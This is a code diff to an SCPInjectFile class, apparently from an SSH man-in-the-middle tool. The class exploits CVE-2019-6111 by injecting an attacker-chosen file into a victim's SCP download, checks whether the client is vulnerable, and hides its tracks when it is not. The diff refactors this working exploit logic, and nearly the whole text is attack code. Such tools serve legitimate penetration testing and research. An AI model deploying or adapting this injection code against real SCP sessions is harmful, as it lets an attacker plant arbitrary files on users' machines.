@@ -31,35 +31,24 @@ class SCPInjectFile(SCPForwarder):
     def __new__(cls, *args, **kwargs):
         if args[0].scp_command.find(b'-f') != -1:
             return super(SCPInjectFile, cls).__new__(cls)
-        else:
-            logging.info("SCPClient is not downloading a file, reverting to normal SCPForwarder")
-            forwarder = SCPForwarder.__new__(SCPForwarder)
-            forwarder.__init__(args[0])
-            return forwarder
+        logging.info("SCPClient is not downloading a file, reverting to normal SCPForwarder")
+        return SCPForwarder(args[0])
 
     def __init__(self, session) -> None:
         super().__init__(session)
         self.args.scp_inject_file = os.path.expanduser(self.args.scp_inject_file)
 
-        self.injectable = False
         self.inject_file_stat = os.stat(self.args.scp_inject_file)
         self.file_to_inject = None
 
     def process_data(self, traffic):
         if traffic == b'\x00':
-            self.injectable = True
             self.exploit()
         return traffic
 
-    def handle_traffic(self, traffic):
-        if not self.injectable:
-            return super(SCPInjectFile, self).handle_traffic(traffic)
-        else:
-            self.exploit()
-
     def exploit(self):
         def wait_ok():
-            assert self.session.scp_channel.recv(1024)
+            assert self.session.scp_channel.recv(1024) == b'\x00'
 
         def send_ok():
             self.session.scp_channel.sendall(b'\x00')
@@ -73,17 +62,16 @@ class SCPInjectFile(SCPForwarder):
             self.inject_file_stat.st_size,
             self.args.scp_inject_file.split('/')[-1]
         )
-        logging.info("Sending command %s", command)
+        logging.info("Sending command %s", command.strip())
         self.session.scp_channel.sendall(command)
         try:
             wait_ok()
         except AssertionError:
-            self.injectable = False
             logging.info("Client is not vulnerable to CVE-2019-6111")
             self.hide_tracks()
             return
         self.file_to_inject = open(self.args.scp_inject_file, 'rb')
-        self.session.scp_channel.sendall(self.file_to_inject.read())
+        self.sendall(self.session.scp_channel, self.file_to_inject.read(), self.session.scp_channel.send)
         self.file_to_inject.close()
         send_ok()
         wait_ok()
